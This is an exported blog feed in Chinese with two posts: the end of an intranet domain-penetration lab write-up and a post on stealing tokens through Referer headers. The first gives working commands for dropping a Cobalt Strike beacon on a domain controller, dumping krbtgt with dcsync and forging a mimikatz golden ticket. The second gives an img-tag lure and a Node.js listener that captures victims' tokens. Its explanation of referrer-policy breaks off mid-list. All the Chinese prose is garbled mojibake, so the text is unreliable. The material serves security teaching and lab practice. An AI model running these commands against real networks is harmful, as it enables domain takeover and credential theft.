src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514105022907.png" alt="image-20250514105022907"></p><h4 id="è·å–dcåŸŸæ§æƒé™">è·å–dcåŸŸæ§æƒé™</h4><p>ç›®å‰æ˜¯æœ‰äº†è®¿é—®<code>dc</code>çš„æƒé™ï¼Œä¸‹é¢å°è¯•è·å–<code>dc</code>åŸŸæ§çš„æ§åˆ¶æƒé™ã€‚</p><h5 id="è®¾ç½®smbè¿æ¥å™¨ï¼Œè¿›è¡Œæ­£å‘è¿æ¥">è®¾ç½®smbè¿æ¥å™¨ï¼Œè¿›è¡Œæ­£å‘è¿æ¥</h5><p>åˆ›å»ºä¸€ä¸ªè¿æ¥å™¨ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514105827103.png" alt="image-20250514105827103"></p><p>ç”Ÿæˆ<code>exe</code>ï¼Œå¹¶ä¸Šä¼ åˆ°åŸŸæ§ä¸Šã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514110655360.png" alt="image-20250514110655360"></p><h5 id="å¤åˆ¶åé—¨æ–‡ä»¶åˆ°åŸŸæ§ä¸­å¹¶æ‰§è¡Œ">å¤åˆ¶åé—¨æ–‡ä»¶åˆ°åŸŸæ§ä¸­å¹¶æ‰§è¡Œ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell copy beacon.exe \\dc\c$\beacon.exe</span><br><span class="line">shell net time \\dc</span><br><span class="line">shell at \\dc 11:49:00 c:/beacon.exe</span><br></pre></td></tr></table></figure><p>æ·»åŠ å®šæ—¶ä»»åŠ¡ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115225164.png" alt="image-20250514115225164"></p><h5 id="åœ¨beaconæ­£å‘è¿æ¥ä¸Šdc">åœ¨beaconæ­£å‘è¿æ¥ä¸Šdc</h5><p><code>link dc</code>è¿æ¥ä¸Š<code>dc</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115403150.png" alt="image-20250514115403150"></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115454588.png" alt="image-20250514115454588"></p><h4 id="è·å–dcæ˜æ–‡å“ˆå¸Œ">è·å–dcæ˜æ–‡å“ˆå¸Œ</h4><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115901753.png" alt="image-20250514115901753"></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115954384.png" alt="image-20250514115954384"></p><h4 id="csåˆ¶ä½œé»„é‡‘ç¥¨æ®">csåˆ¶ä½œé»„é‡‘ç¥¨æ®</h4><h5 id="åœ¨åŸŸæ§ä¸Šæ‰§è¡Œå‘½ä»¤å¯¼å‡ºkrbtgtä¿¡æ¯">åœ¨åŸŸæ§ä¸Šæ‰§è¡Œå‘½ä»¤å¯¼å‡ºkrbtgtä¿¡æ¯</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">dcsync hackbox.com hackbox\krbtgt</span></span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514120300664.png" alt="image-20250514120300664"></p><p>è·å–æ•°æ®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åŸŸ:hackbox.com</span><br><span class="line">krbtgtçš„NTLMå“ˆå¸Œå€¼ä¸º:6f60ace6accbcb76078ccc0312174e98</span><br><span class="line">åŸŸçš„SIDï¼ˆæ™®é€šç”¨æˆ·çš„SIDé™¤å»æœ€åä¸‰ä½å°±æ˜¯åŸŸçš„SIDï¼‰:S-1-5-21-2005268815-658469957-1189185684</span><br></pre></td></tr></table></figure><h5 id="åœ¨webæœåŠ¡å™¨ä¸Šåˆ¶ä½œé»„é‡‘ç¥¨æ®">åœ¨webæœåŠ¡å™¨ä¸Šåˆ¶ä½œé»„é‡‘ç¥¨æ®</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:x2ntest1 /domain:hackbox.com /sid:S-1-5-21-2005268815-658469957-1189185684 /krbtgt:6f60ace6accbcb76078ccc0312174e98 /endin:480 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514121400389.png" alt="image-20250514121400389"></p><p>æœªä½¿ç”¨ç¥¨æ®å‰ï¼Œè®¿é—®å¤±è´¥ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514122841610.png" alt="image-20250514122841610"></p><p>ä½¿ç”¨é»„é‡‘ç¥¨æ®åï¼Œå¯ä»¥ç›´æ¥è®¿é—®åŸŸæ§äº†ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514123111483.png" alt="image-20250514123111483"></p><h2 id="FLAGè·å–">FLAGè·å–</h2><h3 id="Web-flag1">Web flag1</h3><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514122330806.png" alt="image-20250514122330806"></p><h3 id="Web-flag2">Web flag2</h3><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514122516477.png" alt="image-20250514122516477"></p><h3 id="DC-flag3">DC flag3</h3><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514123200938.png" alt="image-20250514123200938"></p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://github.com/fofapro/Hosts_scan">https://github.com/fofapro/Hosts_scan</a> <a href="#fnref1" class="footnote-backref">â†©ï¸</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://www.cnblogs.com/baicaix86/p/16418840.html">https://www.cnblogs.com/baicaix86/p/16418840.html</a> <a href="#fnref2" class="footnote-backref">â†©ï¸</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a> <a href="#fnref3" class="footnote-backref">â†©ï¸</a></p></li><li id="fn4" class="footnote-item"><p><a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919</a> <a href="#fnref4" class="footnote-backref">â†©ï¸</a></p></li><li id="fn5" class="footnote-item"><p><a href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a> <a href="#fnref5" class="footnote-backref">â†©ï¸</a></p></li><li id="fn6" class="footnote-item"><p><a href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a> <a href="#fnref6" class="footnote-backref">â†©ï¸</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸæ§ </tag>
            
            <tag> é»„é‡‘ç¥¨æ® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®åŒ…referrerå¤´ä¸­æ•æ„Ÿä¿¡æ¯çš„çªƒå–</title>
      <link href="/2025/05/06/%E6%95%B0%E6%8D%AE%E5%8C%85referer%E5%A4%B4%E4%B8%AD%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AA%83%E5%8F%96/"/>
      <url>/2025/05/06/%E6%95%B0%E6%8D%AE%E5%8C%85referer%E5%A4%B4%E4%B8%AD%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AA%83%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>åœ¨æˆ‘ä»¬æ—¥å¸¸æ¼æ´æŒ–æ˜çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šç¢°è§æ•°æ®åŒ…ä¸­çš„<code>referer</code>å¸¦æœ‰ä¸€äº›ä¿¡æ¯çš„æƒ…å†µï¼Œå¦‚<code>token</code>ã€<code>sessionid</code>,<code>key</code>å’Œ<code>phoneNumber</code>ç­‰ï¼Œå¯¹äºè¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬å¦‚ä½•å»çªƒå–å‘¢ï¼Ÿè¿™é‡Œå¯ä»¥ä½¿ç”¨<code>img</code>æ ‡ç­¾å»è¿›è¡Œä¿¡æ¯çš„çªƒå–ã€‚</p><p><strong>åœºæ™¯å¦‚ä¸‹ï¼š</strong></p><p><code>A</code>ä¸º<code>url</code>ï¼Œå…¶å€¼ä¸º<code>https://test.com/index.html?token=xxxxxx</code>ï¼Œå½“æˆ‘ä»¬è®¿é—®<code>A</code>æ—¶è¿›å…¥åˆ°çš„é¡µé¢ä¸º<code>B</code>ï¼Œ<code>B</code>çš„<code>html</code>ä¸­æœ‰ä¸€ä¸ª<code>&lt;img&gt;</code>æ ‡ç­¾ï¼Œè¿™ä¸ªæ ‡ç­¾çš„<code>src</code>å±æ€§æ˜¯æˆ‘ä»¬å¯ä»¥éšæ„æ§åˆ¶çš„ï¼Œä¸”è¿™ä¸ª<code>B</code>é¡µé¢å¯ç”¨äº†<code>unsafe-url</code>ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>unsafe-url</code>æ˜¯ä¸å¯ç”¨çš„ï¼Œä¸å¯ç”¨æ—¶é»˜è®¤<code>referer</code>çš„å†…å®¹ä¸º<strong>åè®®ã€ä¸»æœºåå’Œç«¯å£</strong>ï¼Œä¸æºå¸¦å‚æ•°ï¼Œè¿™æ˜¯<code>Referrer Policy</code>ï¼Œåé¢æˆ‘ä¼šæåˆ°ã€‚</p><p><strong>çœŸå®ç¯å¢ƒåœºæ™¯ï¼š</strong></p><p>ä¸€åˆ‡<code>&lt;img&gt;</code>æ ‡ç­¾çš„<code>src</code>å±æ€§å¯æ§çš„ç‚¹éƒ½æœ‰å¯èƒ½ã€‚</p><p>ä¾‹å¦‚ï¼š</p><ul><li>è®ºå›ç«™ç‚¹ï¼Œç”¨æˆ·çš„å¤´åƒ<code>url</code>å¯æ§ï¼Œå¯¹åº”äº<code>img</code>ä¸­çš„<code>src</code>å¯æ§ã€‚</li><li>è§†é¢‘æ’­æ”¾ç«™ç‚¹ï¼Œå­˜åœ¨è¯„è®ºåŒºï¼Œç”¨æˆ·å¤´åƒ<code>url</code>å¯æ§ã€‚</li></ul><h2 id="æ”»å‡»åœºæ™¯æ¼”ç¤º">æ”»å‡»åœºæ™¯æ¼”ç¤º</h2><blockquote><p>æ”»å‡»æ•ˆæœï¼š å—å®³è€…ä¼šå¸¦ç€è‡ªå·±çš„<code>token</code>ï¼Œå°±æ˜¯è¿™é‡Œçš„<code>A</code>ï¼Œè®¿é—®åˆ°é¡µé¢<code>B</code>ï¼Œ<code>B</code>ä¸­çš„<code>img</code>æ ‡ç­¾çš„<code>src</code>å±æ€§æˆ‘ä»¬å¯æ§ï¼Œè®¾ç½®ä¸ºæ”»å‡»è€…ç›‘å¬æ•°æ®åŒ…çš„è„šæœ¬ï¼Œç›‘å¬çš„æ•°æ®åŒ…ä¸­åŒ…å«æœ‰æ•æ„Ÿä¿¡æ¯çš„<code>referer</code>ï¼Œè¿›è€Œå®ç°ä¿¡æ¯çš„çªƒå–ã€‚</p></blockquote><p>ä¸‹é¢æ¥æ¼”ç¤ºä¸€ä¸‹æ•æ„Ÿä¿¡æ¯çš„çªƒå–ã€‚</p><ul><li><code>A</code>ä¸º<code>URL</code>ï¼š<code>http://127.0.0.1:3000/index.html?token=xxxxxx</code></li><li><code>B</code>ä¸ºè¿™ä¸ª<code>index.html</code>é¡µé¢ï¼Œå…¶ä¸­<code>img</code>æ ‡ç­¾çš„<code>src</code>å±æ€§æˆ‘ä»¬å¯æ§ï¼Œå…¶é¡µé¢å¯ç”¨äº†<code>unsafe-url</code>ã€‚</li></ul><p><code>B</code>çš„<code>index.html</code>é¡µé¢å¦‚ä¸‹ï¼Œå…¶ä¸­çš„<code>http://127.0.0.1:3001/logo.png</code>ä¸ºæ”»å‡»è€…åµŒå…¥çš„ç›‘å¬æ•°æ®åŒ…è„šæœ¬ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;unsafe-url&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Logo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Logo Picture<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:3001/logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Logo Picture&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ª<code>http://127.0.0.1:3001/logo.png</code>çš„åç«¯<code>nodejs</code>è„šæœ¬<code>main.js</code>å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hostname = <span class="string">&#x27;0.0.0.0&#x27;</span>; <span class="comment">// ç›‘å¬æ‰€æœ‰å¯ç”¨çš„ç½‘ç»œæ¥å£</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3001</span>; <span class="comment">// æ‚¨å¸Œæœ›æœåŠ¡å™¨ç›‘å¬çš„ç«¯å£</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> parsedUrl = url.<span class="title function_">parse</span>(req.<span class="property">url</span>, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">const</span> pathname = parsedUrl.<span class="property">pathname</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pathname === <span class="string">&#x27;/logo.png&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;-------------------- è¯·æ±‚è¯¦æƒ… --------------------&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`è¯·æ±‚æ–¹æ³•: <span class="subst">$&#123;req.method&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`è¯·æ±‚ URL: <span class="subst">$&#123;req.url&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è¯·æ±‚å¤´:&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">headers</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--------------------------------------------------&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;image/png&#x27;</span> &#125;);</span><br><span class="line">    <span class="comment">// åœ¨è¿™é‡Œæ‚¨å¯ä»¥å®é™…è¯»å–å¹¶è¿”å›ä¸€ä¸ª logo.png æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">// ä¸ºäº†æ¼”ç¤ºï¼Œæˆ‘ä»¬å‘é€ä¸€ä¸ªç®€å•çš„é€æ˜åƒç´  GIF</span></span><br><span class="line">    <span class="keyword">const</span> transparentPixel = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(transparentPixel);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">404</span>, &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span> &#125;);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Not Found&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(port, hostname, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`æœåŠ¡å™¨è¿è¡Œåœ¨ http://<span class="subst">$&#123;hostname&#125;</span>:<span class="subst">$&#123;port&#125;</span>/`</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`è¯·è®¿é—® http://<span class="subst">$&#123;hostname&#125;</span>:<span class="subst">$&#123;port&#125;</span>/logo.png æŸ¥çœ‹è¯·æ±‚è¯¦æƒ…ã€‚`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æ”»å‡»è€…åœ¨è‡ªå·±çš„<code>vps</code>ä¸Šè¿è¡Œè„šæœ¬<code>main.js</code>ï¼Œå—å®³è€…è®¿é—®åˆ°çš„é¡µé¢ä¸º<code>http://127.0.0.1:3000/index.html</code>ã€‚</p><p>æœ¬åœ°ä½¿ç”¨<code>python</code>å¯åŠ¨ä¸€ä¸ª<code>HTTP</code>æœåŠ¡ï¼Œæ¨¡æ‹Ÿå—å®³è€…è®¿é—®çš„é¡µé¢ã€‚</p><p>åœ¨<code>index.html</code>åŒç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤<code>python -m http.server 3000</code>ï¼Œæ­¤æ—¶æ”»å‡»è€…<code>node main.js</code>å¯åŠ¨ç›‘å¬è„šæœ¬ã€‚</p><p>æ­¤æ—¶å—å®³è€…è®¿é—®åˆ°<code>A</code>ï¼Œå—å®³è€…çš„<code>token</code>æˆåŠŸè¢«æ”»å‡»è€…çªƒå–ã€‚</p><p><img src="/2025/05/06/%E6%95%B0%E6%8D%AE%E5%8C%85referer%E5%A4%B4%E4%B8%AD%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AA%83%E5%8F%96/image-20250506143443451.png" alt="image-20250506143443451"></p><p>å†æ¥çœ‹ä¸€ä¸‹ä¸å¯ç”¨<code>unsafe-url</code>çš„æƒ…å†µã€‚</p><p>ä¿®æ”¹<code>index.html</code>ä¸º<code>index2.html</code>å¦‚ä¸‹ï¼Œåˆ‡æ¢ä¸ºé»˜è®¤æƒ…å†µã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;meta name=&quot;referrer&quot; content=&quot;unsafe-url&quot;&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Logo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Logo Picture<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:3001/logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Logo Picture&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è®¿é—®<code>http://localhost:3000/index2.html?token=xxxxx</code>ï¼Œè¿™é‡Œå‘ç°<code>referer</code>ä¸­çš„<code>token</code>å°±ä¼šæ¶ˆå¤±äº†ã€‚æ­¤å¤„æµ‹è¯•ä½¿ç”¨çš„æµè§ˆå™¨ä¸ºChrome 135.0.7049.115ï¼ˆæ­£å¼ç‰ˆæœ¬ï¼‰ (arm64)ã€‚å‡ºç°è¿™ç§æƒ…å†µæ˜¯ç”±äº<code>referrer-policy</code>çš„å…³ç³»ã€‚</p><p><img src="/2025/05/06/%E6%95%B0%E6%8D%AE%E5%8C%85referer%E5%A4%B4%E4%B8%AD%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AA%83%E5%8F%96/image-20250506144151403.png" alt="image-20250506144151403"></p><h2 id="Referrer-policy">Referrer-policy</h2><p>ä»‹ç»ä¸€ä¸‹ <code>referrer-policy</code>ã€‚å®ƒæ˜¯ä¸€ä¸ª HTTP å¤´éƒ¨ï¼Œç”¨äºæ§åˆ¶åœ¨ç”¨æˆ·å¯¼èˆªåˆ°å…¶ä»–ç½‘é¡µæ—¶ï¼Œæµè§ˆå™¨åœ¨ HTTP è¯·æ±‚çš„ <code>Referer</code> å¤´éƒ¨ä¸­å‘é€å“ªäº›ä¿¡æ¯ã€‚<code>Referer</code> å¤´éƒ¨åŒ…å«äº†å‰ä¸€ä¸ªé¡µé¢çš„ URLï¼Œè¿™å¯¹äºåˆ†æç”¨æˆ·æ¥æºã€å®‰å…¨æ€§å’Œå†…å®¹å®šåˆ¶ç­‰æ–¹é¢éå¸¸æœ‰ç”¨ã€‚ç„¶è€Œï¼Œå‡ºäºéšç§å’Œå®‰å…¨è€ƒè™‘ï¼Œå¼€å‘è€…å¯èƒ½éœ€è¦é™åˆ¶ç”šè‡³å®Œå…¨é˜»æ­¢ <code>Referer</code> ä¿¡æ¯çš„å‘é€ã€‚<code>referrer-policy</code> å°±æ˜¯ä¸ºäº†å®ç°è¿™ç§æ§åˆ¶è€Œç”Ÿçš„ã€‚</p><p><strong>ä¸ºä»€ä¹ˆéœ€è¦ <code>referrer-policy</code>ï¼Ÿ</strong></p><ul><li><strong>éšç§ä¿æŠ¤:</strong> æœ‰äº›é¡µé¢çš„ URL å¯èƒ½åŒ…å«ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œä¼šè¯ IDã€ç”¨æˆ·åç­‰ï¼‰ã€‚ä¸åŠ é™åˆ¶åœ°å‘é€ <code>Referer</code> å¯èƒ½ä¼šæ³„éœ²è¿™äº›ä¿¡æ¯ç»™ç¬¬ä¸‰æ–¹ç½‘ç«™ã€‚</li><li><strong>å®‰å…¨æ€§:</strong> æ¶æ„ç½‘ç«™å¯èƒ½ä¼šåˆ©ç”¨ <code>Referer</code> ä¿¡æ¯è¿›è¡ŒæŸäº›æ”»å‡»ï¼Œä¾‹å¦‚è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰çš„å˜ç§ã€‚</li><li><strong>æ•°æ®åˆ†æçš„ç²¾ç»†åŒ–æ§åˆ¶:</strong> å¼€å‘è€…å¯èƒ½å¸Œæœ›æ›´ç²¾ç¡®åœ°æ§åˆ¶å“ªäº›æ¥æºä¿¡æ¯å¯ä»¥è¢«åˆ†æå·¥å…·æ”¶é›†ã€‚</li></ul><h3 id="referrer-policy-çš„å–å€¼"><code>referrer-policy</code> çš„å–å€¼</h3><p><code>referrer-policy</code> å¤´éƒ¨å¯ä»¥è®¾ç½®å¤šä¸ªä¸åŒçš„å€¼ï¼Œè¿™äº›å€¼å®šä¹‰äº†åœ¨ä¸åŒåœºæ™¯ä¸‹ <code>Referer</code> å¤´éƒ¨åº”è¯¥å¦‚ä½•å‘é€ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å–å€¼åŠå…¶å«ä¹‰ï¼š</p><ul><li><strong><code>no-referrer</code>:</strong> è¿™æ˜¯æœ€ä¸¥æ ¼çš„ç­–ç•¥ã€‚æ— è®ºåœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œéƒ½ä¸ä¼šå‘é€ <code>Referer</code> å¤´éƒ¨ã€‚</li><li><strong><code>no-referrer-when-downgrade</code>:</strong> è¿™æ˜¯é»˜è®¤ç­–ç•¥ã€‚åªæœ‰åœ¨ä» <code>HTTPS</code> é¡µé¢å¯¼èˆªåˆ° <code>HTTP</code> é¡µé¢æ—¶ï¼Œæ‰ä¼šä¸å‘é€ <code>Referer</code> å¤´éƒ¨ã€‚åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼ˆä¾‹å¦‚ï¼Œ<code>HTTPS</code> åˆ° <code>HTTPS</code>ï¼Œ<code>HTTP</code> åˆ° <code>HTTP</code>ï¼Œ<code>HTTP</code> åˆ° 